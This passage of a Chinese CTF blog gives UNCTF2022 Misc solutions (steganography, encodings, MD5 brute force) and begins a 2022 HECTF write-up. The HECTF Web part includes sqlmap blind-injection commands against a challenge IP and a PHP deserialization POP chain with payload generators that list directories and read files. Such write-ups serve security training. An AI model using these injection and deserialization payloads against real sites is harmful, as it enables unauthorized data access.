<span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">flag = test()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&quot;flag&#123;09de44be-5b3d-11ed-b764-ac1203ab14d7&#125;\xb0vgf\x96\xdf`v\xc6d@\x14\xf7\x98\xaf\xac&#x27;\xf8K\xbb+\x00&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h3><blockquote><p>乱码+零宽隐写</p></blockquote><p>Wingdings字体转正常字体如宋体，全选内容复制，零宽隐写工具提取得 <code>unctf&#123;We1come_new_ctfer&#125;</code>。</p><p>​    </p><h3 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h3><p>以压缩包方式打开docx，在document.xml中发现：</p><p><code>&lt;w:rFonts w:hint=&quot;default&quot; w:cs=&quot;flag&#123;You_find_me!&#125;&quot; w:asciiTheme=&quot;minorAscii&quot; w:hAnsiTheme=&quot;minorAscii&quot;/&gt;</code></p><p>​    </p><h3 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h3><p>在log文件中找到关键一行：</p><p><code>Nov  2 02:34:14 ubuntu bi0x: [Password] cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA==</code></p><p>base64解码得到密码 <code>password is U6nu2_i3_b3St</code>，解压得flag：<code>unctf&#123;N1_sH3_D0n9_L0g_dE!&#125;</code></p><p>​    </p><h3 id="In-the-Morse-Garden"><a href="#In-the-Morse-Garden" class="headerlink" title="In_the_Morse_Garden"></a>In_the_Morse_Garden</h3><p>PDF中全选复制出文字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm</span><br><span class="line">+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5</span><br><span class="line">46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO</span><br><span class="line">WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k</span><br><span class="line">5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm</span><br><span class="line">+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y</span><br><span class="line">2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3</span><br><span class="line">lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54</span><br><span class="line">6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW</span><br><span class="line">PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y</span><br><span class="line">+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja</span><br><span class="line">Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN</span><br><span class="line">oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T</span><br><span class="line">ljaE=&#125;</span><br></pre></td></tr></table></figure><p>中间部分base64解码得到的 <code>依古比古</code> 换为 <code>.</code>，<code>玛卡巴卡</code> 换为 <code>-</code>，再摩斯密码解得 <code>WAN_AN_MAKA_BAKAAAAA!</code>。</p><p>​    </p><h3 id="清和fan"><a href="#清和fan" class="headerlink" title="清和fan"></a>清和fan</h3><blockquote><p>小w一直对真人二次元没啥抵抗力，当他见到清和的时候，小w直呼这就是心动的感觉。</p></blockquote><p>第一层，根据压缩包注释，密码为清和B站uid下划线最高播放量视频发布日期，找到密码 <code>836885_2022/05/20</code>；</p><p>第二层，png图片LSB隐写，提取出 <code>password is :qq857488580</code>；</p><p>第三层，音频文件SSTV，得到图片中密码 <code>V@mpir3</code>；</p><p>最后一层，文本内零宽隐写，用在线工具提取得到 <code>unctf&#123;wha1e_wants_a_girlfriend_like_alicia&#125;</code>。</p><p>​    </p><h3 id="芝麻开门"><a href="#芝麻开门" class="headerlink" title="芝麻开门"></a>芝麻开门</h3><p>带密码的LSB隐写：<code>python2 lsb.py extract flag.png xxx.txt key1</code></p><p>flag: <code>flag&#123;faf5bdd5-ba3d-11da-ad31-d33d75182f1b&#125;</code></p><p>​    </p><h3 id="我小心海也绝非鳝类"><a href="#我小心海也绝非鳝类" class="headerlink" title="我小心海也绝非鳝类"></a>我小心海也绝非鳝类</h3><p>png图片中有字符串 <code>F#S&lt;YIcHnAG;</code>，base92解码 <code>flaginmd5</code>；尾部 <code>RUFTWUxTQg==</code>，base64解码 <code>EASYLSB</code>。</p><p>zsteg查看不到有用信息，用cloaked-pixel带密码的LSB提取：<code>python2 lsb.py extract 1.png out.txt flaginmd5</code>，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8FA14CDD754F91CC6554C9E71929CCE72DB95E8E1A9267B7A1188556B2013B330CC175B9C0F1B6A831C399E269772661B2F5FF47436671B6E533D8DC3614845DF95B70FDC3088560732A5AC135644506F1290186A5D0B1CEAB27F4E77C0C5D68E1671797C52E15F763380B45E841EC322DB95E8E1A9267B7A1188556B2013B334A8A08F09D37B73795649038408B5F33D95679752134A2D9EB61DBD7B91C4BCC6F8F57715090DA2632453988D9A1501BE1671797C52E15F763380B45E841EC32B14A7B8059D9C055954C92674CE60032E358EFA489F58062F10DD7316B65649ED95679752134A2D9EB61DBD7B91C4BCCB14A7B8059D9C055954C92674CE600326F8F57715090DA2632453988D9A1501B865C0C0B4AB0E063E5CAA3387C1A874103C7C0ACE395D80182DB07AE2C30F0344A8A08F09D37B73795649038408B5F33CBB184DD8E05C9709E5DCAEDAA0495CF</span><br></pre></td></tr></table></figure><p>根据前面的提示，这串字符串为md5值的组合，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#xx27;</span>.lower()</span><br><span class="line">s = [s[<span class="number">32</span>*i:<span class="number">32</span>*i+<span class="number">32</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    dic[md5(<span class="built_in">chr</span>(k).encode()).hexdigest()] = <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> s:</span><br><span class="line">    flag += dic[k]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;welcome_to_misc&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MY-PICTURE"><a href="#MY-PICTURE" class="headerlink" title="MY PICTURE"></a>MY PICTURE</h3><p>将dat文件异或0x8e，解压得到encode.py，内为图片加密算法，逻辑为逐像素RGB值简单异或，还原即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">c = Image.<span class="built_in">open</span>(<span class="string">r&#x27;flag.png&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">l,h = c.size</span><br><span class="line"><span class="built_in">print</span>(l,h)</span><br><span class="line">m = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(h,l))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">      r1,g1,b1 = c.getpixel((i,j))</span><br><span class="line">      r = g1^b1</span><br><span class="line">      g = r1^r</span><br><span class="line">      b = g1^g</span><br><span class="line">      m.putpixel(((i*<span class="number">1200</span>+j)//<span class="number">787</span>,(i*<span class="number">1200</span>+j)%<span class="number">787</span>),(b,g,r))</span><br><span class="line">m.save(<span class="string">r&#x27;flag.jpg&#x27;</span>)</span><br><span class="line">c.close()</span><br><span class="line">m.close()</span><br></pre></td></tr></table></figure><p>还原图片中的flag：<code>UNCTF&#123;93bb442f-2a76-2b6f-c42f-c2297f5fdaf9&#125;</code>。</p><p>​    </p><h3 id="贝斯家族的侵略"><a href="#贝斯家族的侵略" class="headerlink" title="贝斯家族的侵略"></a>贝斯家族的侵略</h3><blockquote><p>提示1：如果明文攻击失败，尝试使用bandzip</p><p>提示2：会动的鼠标</p></blockquote><p>第一层，根据提示1，bandzip压缩后明文攻击，解压；</p><p>第二层，base64隐写，脚本提取隐写内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">stegb64 = <span class="string">&#x27;&#x27;</span>.join(line.split())</span><br><span class="line">rowb64 =  <span class="string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).split())</span><br><span class="line">offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[-<span class="number">1</span>]))</span><br><span class="line">equalnum = stegb64.count(<span class="string">&#x27;=&#x27;</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line"><span class="keyword">if</span> equalnum:</span><br><span class="line">bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)])) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure><p>得到的内容16进制转字符串，得到一个文件；</p><p>第三层，根据文件内的提示 <code>Macro.mrf</code>，猜测为鼠标轨迹记录，使用Macro Recorder工具打开，逐条查看轨迹得到flag：<code>flag&#123;b4s3_1s_v3ry_g0od!!&#125;</code>。</p><p>​    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2022赛" scheme="https://lazzzaro.github.io/tags/2022%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2022 HECTF</title>
    <link href="https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/"/>
    <id>https://lazzzaro.github.io/2022/11/07/match-2022-HECTF/</id>
    <published>2022-11-07T13:38:28.000Z</published>
    <updated>2022-11-28T16:24:14.457Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>2022HECTF是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，是面向全国大学生的一次竞技活动。</p><p><strong>Rank: 1</strong></p><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h3><blockquote><p>签到题</p><p>HINTS:</p><p>官网地址需填写完整(建议复制)，无路径即结尾为.cn</p></blockquote><p>进入是迷惑性的404页面，且右键和F12禁用，地址栏手动添加 <code>view-source:</code> 看到源码提示 <code>hectfer</code>。</p><p>访问 <code>/hectfer</code> 提示 <code>hebnu is a good site.</code>，访问 <code>/hebnu</code> 提示 <code>Can you use another way of requesting?</code></p><p>上burpsuite，按提示按步骤修改request header的几处为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /hebnu HTTP/1.1</span><br><span class="line">User-Agent: Internet Explorer</span><br><span class="line">Referer: https://www.hebtu.edu.cn</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>在responce header里看到PHPFuck代码，控制台运行直接得到flag：<code>HECTF&#123;sfe2fsa_f39sjfa_hj93sf_ef0skf3fs&#125;</code>。</p><p>​    </p><h3 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h3><p>找到GET参数id，用sqlmap可以直接通过时间盲注跑出flag。</p><p>命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆数据库名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，爆表名</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库名ctf，表名3eDf4f07efC9ee16，爆列名和内容</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://121.4.111.50:32614/?id=1&quot;</span> -D ctf -T 3eDf4f07efC9ee16 --columns --dump</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-unserialize"><a href="#easy-unserialize" class="headerlink" title="easy_unserialize"></a>easy_unserialize</h3><blockquote><p>一道神奇的反序列化题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;Welcome to HECTF Have fun!!!😊&lt;br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line"> <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;难道我真的要失败了，吗&quot;</span>.<span class="variable language_">$this</span>-&gt;str;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;huang-&gt;str;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$eee</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$aaa</span>=<span class="string">&quot;who are you?&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$ccc</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eee-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$css</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;ccc;</span><br><span class="line">     <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ddd</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$ext</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;ext-&gt;<span class="title function_ invoke__">nisa</span>(<span class="variable">$this</span>-&gt;ddd);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ddd</span>(<span class="variable">$this</span>-&gt;ext);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$gagaga</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$gagaga</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>); </span><br></pre></td></tr></table></figure></blockquote><p>构造反序列化链：</p><p><code>A:__wakeup() =&gt; B:__isset() =&gt; C:__toString() =&gt; D:flag() =&gt; B:__call() =&gt; C:__get() =&gt; D:__invoke() =&gt; echo new()</code></p><p>利用内置类 <code>DirectoryIterator</code> + <code>glob://</code>伪协议列目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;DirectoryIterator&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;glob:///*f*&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload:</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A17%3A%22DirectoryIterator%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A11%3A%22glob%3A///%2Af%2A%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># 文件名 /ffflllllaaaaaaggggg.txt</span></span><br></pre></td></tr></table></figure><p>再利用内置类 <code>SplFileObject</code> + <code>php://filter</code>伪协议读文件内容： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">from</span> 